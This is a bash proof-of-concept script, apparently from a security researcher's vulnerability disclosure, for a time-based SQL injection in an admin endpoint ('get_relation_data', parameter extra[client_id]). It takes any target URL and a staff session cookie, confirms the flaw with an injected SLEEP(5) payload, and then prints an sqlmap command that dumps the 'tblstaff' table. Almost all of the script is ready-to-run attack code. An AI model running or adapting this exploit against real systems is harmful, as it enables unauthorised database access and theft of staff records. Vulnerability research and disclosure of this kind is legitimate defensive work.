#!/usr/bin/env bash
# VULN-04 — SQLi via admin/misc/get_relation_data (extra[client_id])
# Researcher: tal7aouy
# Usage: ./poc.sh https://target "<staff_session_cookie>"
set -euo pipefail
TARGET="${1:-http://localhost}"; COOKIE="${2:-}"

echo "[*] VULN-04 — time-based confirmation (extra[client_id])"
echo "[*] Baseline:"
curl -sk -H "Cookie: $COOKIE" -o /dev/null -w "    normal: %{time_total}s\n" \
  --data "type=contact&extra[client_id]=1" \
  "${TARGET%/}/admin/misc/get_relation_data"

echo "[*] Injected SLEEP(5):"
curl -sk -H "Cookie: $COOKIE" -o /dev/null -w "    inject: %{time_total}s\n" \
  --data-urlencode "type=contact" \
  --data-urlencode "extra[client_id]=0 OR (SELECT SLEEP(5))" \
  "${TARGET%/}/admin/misc/get_relation_data"

cat <<TXT

[*] ~5s slower on the injected request => confirmed.
[*] Dump:
    sqlmap -u "${TARGET%/}/admin/misc/get_relation_data" --cookie="$COOKIE" \\
      --data="type=contact&extra[client_id]=1" -p "extra[client_id]" --dbms mysql --dump -T tblstaff
TXT
